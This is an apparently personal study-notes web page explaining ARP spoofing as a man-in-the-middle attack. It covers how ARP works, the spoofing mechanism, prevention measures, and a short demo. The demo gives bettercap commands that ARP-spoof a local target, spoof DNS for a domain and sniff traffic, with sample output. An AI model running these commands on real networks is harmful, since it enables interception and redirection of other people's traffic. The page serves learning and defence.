<!DOCTYPE html>
<html lang="en-us" dir="ltr">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="
  ARP Spoofing Attack
  #


ARP: Address Resolution Protocol
A type of MitM attack


  How ARP Works
  #


ARP Basics:

ARP is used to map an IP address to a MAC address within a local network
When a device wants to communicate with another, it broadcasts an ARP request: &ldquo;Who has IP 192.168.1.1? Tell me your MAC address.&rdquo;
The device with the corresponding IP replies with its MAC address


Normal Communication:

Once ARP resolves the IP-to-MAC mapping, devices communicate directly using MAC addresses




  How ARP Spoofing Works
  #


The attacker sends forged ARP replies to the victim device and/or the router, claiming:

&ldquo;I am the router (192.168.1.1)&rdquo; to the victim
&ldquo;I am the victim (192.168.1.100)&rdquo; to the router


Both the victim and the router update their ARP tables with the attacker&rsquo;s MAC address for the claimed IP
As a result:

All traffic from the victim to the router (and vice versa) flows through the attacker
The attacker becomes a &ldquo;man-in-the-middle&rdquo; (MITM), able to intercept or modify traffic




  Diagram
  #

Normal Traffic:
Victim → Router → Internet">
<meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff">
<meta name="theme-color" media="(prefers-color-scheme: dark)" content="#343a40">
<meta name="color-scheme" content="light dark"><meta property="og:url" content="https://dangpham112000.github.io/docs/research/security/arp_spoofing/">
  <meta property="og:site_name" content="Dante 0401">
  <meta property="og:title" content="ARP Spoofing - Draft">
  <meta property="og:description" content="ARP Spoofing Attack # ARP: Address Resolution Protocol A type of MitM attack How ARP Works # ARP Basics: ARP is used to map an IP address to a MAC address within a local network When a device wants to communicate with another, it broadcasts an ARP request: “Who has IP 192.168.1.1? Tell me your MAC address.” The device with the corresponding IP replies with its MAC address Normal Communication: Once ARP resolves the IP-to-MAC mapping, devices communicate directly using MAC addresses How ARP Spoofing Works # The attacker sends forged ARP replies to the victim device and/or the router, claiming: “I am the router (192.168.1.1)” to the victim “I am the victim (192.168.1.100)” to the router Both the victim and the router update their ARP tables with the attacker’s MAC address for the claimed IP As a result: All traffic from the victim to the router (and vice versa) flows through the attacker The attacker becomes a “man-in-the-middle” (MITM), able to intercept or modify traffic Diagram # Normal Traffic: Victim → Router → Internet">
  <meta property="og:locale" content="en_us">
  <meta property="og:type" content="article">
    <meta property="article:section" content="docs">
    <meta property="article:published_time" content="2024-06-15T01:47:46+07:00">
    <meta property="article:modified_time" content="2024-06-15T01:47:46+07:00">
<title>ARP Spoofing - Draft | Dante 0401</title>
<link rel="manifest" href="/manifest.json">
<link rel="icon" href="/favicon.png" >
<link rel="canonical" href="https://dangpham112000.github.io/docs/research/security/arp_spoofing/">
<link rel="stylesheet" href="/book.min.ef1786281083252320100bd5f394f36844d3252afdbd5bfe72e5f440aaff402b.css" integrity="sha256-7xeGKBCDJSMgEAvV85TzaETTJSr9vVv&#43;cuX0QKr/QCs=" crossorigin="anonymous">
  <script defer src="/fuse.min.js"></script>
  <script defer src="/en.search.min.cd97e111f91cf6d0a675ec89227243a521f38a56a36426a99043da7b93c90e6a.js" integrity="sha256-zZfhEfkc9tCmdeyJInJDpSHzilajZCapkEPae5PJDmo=" crossorigin="anonymous"></script>
<!--
Made with Book Theme
https://github.com/alex-shpak/hugo-book
-->
  
</head>
<body dir="ltr">
  <input type="checkbox" class="hidden toggle" id="menu-control" />
  <input type="checkbox" class="hidden toggle" id="toc-control" />
  <main class="container flex">
    <aside class="book-menu">
      <div class="book-menu-content">
        
  <nav>
<h2 class="book-brand">
  <a class="flex align-center" href="/"><span>Dante 0401</span>
  </a>
</h2>


<div class="book-search hidden">
  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
  <div class="book-search-spinner hidden"></div>
  <ul id="book-search-results"></ul>
</div>
<script>document.querySelector(".book-search").classList.remove("hidden")</script>












  



  
  <ul>
    
      
        <li class="book-section-flat" >
          
  
  

  
    <span>RESEARCH</span>
  

          
  <ul>
    
      
        <li>
          
  
  

  
    <a href="/docs/research/process_vs_thread/" class="">Process vs Thread</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/research/chrome_architecture/" class="">Chrome Architecture</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/research/aws_overview/" class="">AWS Overview</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/research/be_protocol/" class="">Backend Protocol</a>
  

          
  <ul>
    
      
        <li>
          
  
  

  
    <a href="/docs/research/be_protocol/tcp_udp/" class="">TCP - UDP - Draft</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/research/be_protocol/http/" class="">HTTP - Draft</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/research/be_protocol/tls_ssl/" class="">TLS - SSL</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/research/be_protocol/https/" class="">HTTPS - Draft</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/research/be_protocol/webrtc/" class="">WebRTC - Draft</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/research/be_protocol/websocket/" class="">Websocket - Draft</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/research/be_protocol/grpc/" class="">gRPC - Draft</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/research/be_protocol/communication/" class="">Communication - Draft</a>
  

        </li>
      
    
  </ul>

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/research/encryption/" class="">Encryption</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/research/token_based_authentication/" class="">Token-based Authentication</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/research/security/" class="">Security - Draft</a>
  

          
  <ul>
    
      
        <li>
          
  
  

  
    <a href="/docs/research/security/cors/" class="">CORS - draft</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/research/security/xss/" class="">XSS - Draft</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/research/security/csrf/" class="">CSRF - Draft</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/research/security/evil_twin/" class="">Evil Twin - Draft</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/research/security/arp_spoofing/" class="active">ARP Spoofing - Draft</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/research/security/dns_poisoning/" class="">DNS Poisoning - Draft</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/research/security/hsts/" class="">HSTS - Draft</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/research/security/bit_flipping/" class="">Bit Flipping</a>
  

        </li>
      
    
  </ul>

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/research/scale/" class="">Scale</a>
  

        </li>
      
    
  </ul>

        </li>
      
    
      
        <li class="book-section-flat" >
          
  
  

  
    <span>TIPS</span>
  

          
  <ul>
    
      
        <li>
          
  
  

  
    <a href="/docs/tips/001_unit_test/" class="">Unit Test</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/tips/002_git/" class="">Git</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/tips/003_docker/" class="">Docker</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/tips/004_ops/" class="">Ops</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/tips/005_passion/" class="">Spark Passion</a>
  

        </li>
      
    
  </ul>

        </li>
      
    
      
        <li class="book-section-flat" >
          
  
  

  
    <span>PROBLEMS</span>
  

          
  <ul>
    
      
        <li>
          
  
  

  
    <a href="/docs/problems/knight_dialer/" class="">Knight Dialer</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/problems/design_hashmap/" class="">Design HashMap - Draft</a>
  

        </li>
      
    
  </ul>

        </li>
      
    
  </ul>















</nav>




  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>


 
      </div>
    </aside>

    <div class="book-page">
      <header class="book-header">
        
  <div class="flex align-center justify-between">
  <label for="menu-control">
    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
  </label>

  <strong>ARP Spoofing - Draft</strong>

  <label for="toc-control">
    
    <img src="/svg/toc.svg" class="book-icon" alt="Table of Contents" />
    
  </label>
</div>


  
  <aside class="hidden clearfix">
    
  
<nav id="TableOfContents">
  <ul>
    <li><a href="#how-arp-works">How ARP Works</a></li>
    <li><a href="#how-arp-spoofing-works">How ARP Spoofing Works</a></li>
    <li><a href="#diagram">Diagram</a></li>
    <li><a href="#prevention">Prevention</a></li>
    <li><a href="#demo">Demo</a></li>
    <li><a href="#references">References</a></li>
  </ul>
</nav>



  </aside>
  
 
      </header>

      
      
  <article class="markdown book-article"><h1 id="arp-spoofing-attack">
  ARP Spoofing Attack
  <a class="anchor" href="#arp-spoofing-attack">#</a>
</h1>
<ul>
<li>ARP: Address Resolution Protocol</li>
<li>A type of MitM attack</li>
</ul>
<h2 id="how-arp-works">
  How ARP Works
  <a class="anchor" href="#how-arp-works">#</a>
</h2>
<ul>
<li>ARP Basics:
<ul>
<li>ARP is used to map an IP address to a MAC address within a local network</li>
<li>When a device wants to communicate with another, it broadcasts an ARP request: &ldquo;Who has IP 192.168.1.1? Tell me your MAC address.&rdquo;</li>
<li>The device with the corresponding IP replies with its MAC address</li>
</ul>
</li>
<li>Normal Communication:
<ul>
<li>Once ARP resolves the IP-to-MAC mapping, devices communicate directly using MAC addresses</li>
</ul>
</li>
</ul>
<h2 id="how-arp-spoofing-works">
  How ARP Spoofing Works
  <a class="anchor" href="#how-arp-spoofing-works">#</a>
</h2>
<ul>
<li>The attacker sends forged ARP replies to the victim device and/or the router, claiming:
<ul>
<li>&ldquo;I am the router (192.168.1.1)&rdquo; to the victim</li>
<li>&ldquo;I am the victim (192.168.1.100)&rdquo; to the router</li>
</ul>
</li>
<li>Both the victim and the router update their ARP tables with the attacker&rsquo;s MAC address for the claimed IP</li>
<li>As a result:
<ul>
<li>All traffic from the victim to the router (and vice versa) flows through the attacker</li>
<li>The attacker becomes a &ldquo;man-in-the-middle&rdquo; (MITM), able to intercept or modify traffic</li>
</ul>
</li>
</ul>
<h2 id="diagram">
  Diagram
  <a class="anchor" href="#diagram">#</a>
</h2>
<p>Normal Traffic:
Victim → Router → Internet</p>
<p>ARP Spoofing:
Victim → Attacker → Router → Internet</p>
<h2 id="prevention">
  Prevention
  <a class="anchor" href="#prevention">#</a>
</h2>
<ul>
<li>Static ARP Entries: Manually map critical IPs to MAC addresses to prevent changes</li>
<li>Use Encryption: Secure protocols (e.g., HTTPS, SSH, VPN) ensure data confidentiality even if traffic is intercepted</li>
<li>Enable Dynamic ARP Inspection (DAI): On managed switches, DAI verifies ARP packets against a trusted database</li>
</ul>
<h2 id="demo">
  Demo
  <a class="anchor" href="#demo">#</a>
</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Fake dns</span>
</span></span><span style="display:flex;"><span>sudo bettercap -iface wlo1
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># In bettercap:</span>
</span></span><span style="display:flex;"><span>net.probe on
</span></span><span style="display:flex;"><span>net.show
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>set arp.spoof.targets 192.168.1.9
</span></span><span style="display:flex;"><span>set dns.spoof.domains alo1411.team
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>arp.spoof on
</span></span><span style="display:flex;"><span><span style="color:#75715e"># -&gt; Output</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sys.log<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>inf<span style="color:#f92672">]</span> arp.spoof arp spoofer started, probing <span style="color:#ae81ff">1</span> targets
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>dns.spoof on
</span></span><span style="display:flex;"><span><span style="color:#75715e"># E.g output</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sys.log<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>inf<span style="color:#f92672">]</span> dns.spoof alo1411.team -&gt; 192.168.1.17
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>net.sniff
</span></span></code></pre></div><h2 id="references">
  References
  <a class="anchor" href="#references">#</a>
</h2>
<ul>
<li>Bettercap: <a href="https://www.bettercap.org/modules/ethernet/spoofers/dns.spoof/">dns.spoof</a></li>
<li>Bettercap: <a href="https://www.bettercap.org/modules/ethernet/spoofers/arp.spoof/">arp.spoof</a></li>
</ul>
</article>
 
      

      <footer class="book-footer">
        
  <div class="flex flex-wrap justify-between">





</div>



  <script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script>


 
        
      </footer>

      
  
  <div class="book-comments">

</div>
  
 

      <label for="menu-control" class="hidden book-menu-overlay"></label>
    </div>

    
    <aside class="book-toc">
      <div class="book-toc-content">
        
  
<nav id="TableOfContents">
  <ul>
    <li><a href="#how-arp-works">How ARP Works</a></li>
    <li><a href="#how-arp-spoofing-works">How ARP Spoofing Works</a></li>
    <li><a href="#diagram">Diagram</a></li>
    <li><a href="#prevention">Prevention</a></li>
    <li><a href="#demo">Demo</a></li>
    <li><a href="#references">References</a></li>
  </ul>
</nav>


 
      </div>
    </aside>
    
  </main>

  
</body>
</html>












